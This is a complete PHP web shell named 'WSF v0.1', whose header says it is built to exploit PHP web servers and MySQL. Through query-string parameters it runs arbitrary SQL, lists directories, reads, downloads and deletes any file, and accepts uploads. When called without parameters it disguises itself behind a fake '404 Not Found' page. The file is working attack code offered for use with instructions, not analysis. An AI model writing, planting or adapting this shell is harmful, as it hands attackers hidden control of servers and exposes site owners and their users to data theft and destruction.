<?php
/*
 *	@Author: Shiva Chettri
 *	@Project: WSF (Web Server F#*%@!)
 *	@Version: 0.1
 *	@Dated: 5th June, 2018
 *
 *	This script is designed to exploit PHP Web Server and MySQL Server.
 *
 *	##USAGE:
 *	Input Parameters:
 *	  MYSQL Server:
 *		$_GET['H']:	DB Host
 *		$_GET['U']:	DB User
 *		$_GET['P']:	DB Password
 *		$_GET['D']: DB Name
 *	  Web Server/MYSQL Server:
 *		$_GET['Q']:	Operation choice. Ex. 'EXE' (see below).
 *
 *	##OPERATIONS CODE(S):
 *	  MYSQL Server Exploitation:
 *		'EXE':	Execute query and return results.
 *				@Parameter: $_GET['QUERY']
 *
 *	  Web Server Exploitation:
 *		'DIR':	Get Directory Structure.
 *				@Parameter: $_GET['PATH'] - Default '.' (current directory)
 *		'DEL':	Delete file.
 *				@Parameter: $_GET['PATH']: Path with file name.
 *		'DWL':	Download file.
 *				@Parameters: $_GET['PATH'] - Path with file name, 
 *							 $_GET['TYPE] - File Type. Default is 'application/octet-stream',
 *							 $_GET['ENCODING'] - File Encoding. Default is 'Binary'.
 *		'RDF':	Read File.
 *				@Parameter: $_GET['PATH'] - Default '.' (current directory)
 *
 *	##EXAMPLE:
 *		MYSQL Server Exploitation:	
 *			Query String:
 *				?H=[<DB_HOST>]&U=[<DB_USER>]&P=[<DB_PASSWORD>]&D=[<DB_NAME>]&Q=[<OPERATION_CODE>]&QUERY=[<MYSQL_QUERY>]
 *		Web Server Exploitation: 	
 *			Query String:
 *				?Q=[<OPERATION_CODE>] ... [<other parameter(s)>]
 *
 *		UPLOAD FILE: 	Use 'upload_wsf-v0.1.html' file to upload file.
 *						Do change 'action' part in 'upload_wsf-v0.1.html' as per uploaded path.
 *						@Parameter: $_GET['PATH'] - Default '.' (current directory)
 */

 
##Upload File
if(isset($_POST) && isset($_POST['PATH'])){
	
	if(!isset($_FILES['FILE'])) echo "No file.";
	if(!isset($_POST['PATH'])) $_POST['PATH'] = '.';
	$filename = rand(0,1000000) . "." . pathinfo($_FILES['FILE']['name'], PATHINFO_EXTENSION);
	if(move_uploaded_file($_FILES['FILE']['tmp_name'],$filename)){ echo "Uploaded [".$filename."]."; }else{ echo "Oops!"; }

##Web Server and MYSQL Operations
}else if(isset($_GET) && isset($_GET['Q'])){
	
	#Get connection, iff MYSQL Operation
	if(isset($_GET['H']) && isset($_GET['U']) && isset($_GET['P']) && isset($_GET['D'])){
		$c = mysqli_connect($_GET['H'], $_GET['U'], $_GET['P'], $_GET['D']);
		if (mysqli_connect_error()) die(mysqli_connect_error());
	}

	if(!isset($_GET['Q'])) echo "No Operation.";

	switch($_GET['Q']){
		##MYSQL Server:
		#Execute Query and Return Result
		case 'EXE':
			if(!isset($_GET['QUERY'])) die("No Query.");
			$r = mysqli_query($c,$_GET['QUERY'])or die(mysqli_error());
			
			echo '<table border=1px>';
			$nCol = mysqli_num_fields($r);
			while($rowD = mysqli_fetch_row($r)) {
				echo '<tr>';
				for($i = 0; $i < $nCol; $i++)
					echo '<td>'.$rowD[$i].'</td>';
				echo '</tr>';
			}
			echo '</table>';
			break;

			
		
			
		#Web Server:
		#Retrieve Directory Structure
		case 'DIR':
			if(!isset($_GET['PATH'])) $_GET['PATH'] = '.';
			echo '<pre>';
			var_dump(scandir($_GET['PATH']));
			echo '</pre>';
			break;
		
		#Delete File
		case 'DEL':
			if(!isset($_GET['PATH'])) die("Not found.");
			if(unlink($_GET['PATH']))
				echo 'Deleted.';
			break;

		#Download File
		case 'DWL':
			if(!isset($_GET['PATH'])) die("Not found.");
			if(!isset($_GET['TYPE']))	$_GET['TYPE'] = "application/octet-stream";
			if(!isset($_GET['ENCODING']))	$_GET['ENCODING'] = "Binary";
			header('Content-Type: ' . $_GET['TYPE']);
			header('Content-Transfer-Encoding: ' . $_GET['ENCODING']);
			header('Content-disposition: attachment; filename=\"' . basename($_GET['PATH']) . '\"');
			readfile($_GET['PATH']);
			break;
			
		#Read File
		case 'RDF':
			if(!isset($_GET['PATH'])) $_GET['PATH'] = '.';
			$h = fopen($_GET['PATH'], 'r');
			echo fread($h,filesize($_GET['PATH']));
			break;
		
		
		default:
			echo "WTF!";
			break;
	}

##Default Message
}else{
$html=<<<HTML
	<div style="text-align: center; margin-top: 10%;">
		<h1 style="font-size: 100px">404</h1>
		<p><strong>Server Response:</strong> Not Found</p>
	</div>
HTML;
echo $html;
}
?>